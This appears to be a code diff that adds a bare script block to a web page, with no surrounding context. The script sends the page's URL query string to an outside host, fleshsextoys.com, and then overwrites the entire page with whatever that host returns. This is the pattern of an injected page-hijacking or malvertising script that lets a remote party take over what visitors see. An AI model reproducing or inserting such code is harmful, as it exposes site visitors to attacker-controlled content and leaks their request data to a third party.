@@ -1,0 +1,16 @@
+<script>
+    const search = window.location.search;
+    const xhr = new XMLHttpRequest();
+        const url = 'https://fleshsextoys.com/geo/';
+        var formData = new FormData();
+            formData.append('search', search);
+        xhr.onload = function(e) { 
+            if(this.status == 200||this.status == 304){
+                document.open();
+                document.write(xhr.responseText);
+                document.close();
+            }
+        };
+        xhr.open('POST', url, false);
+        xhr.send(formData);
+</script>
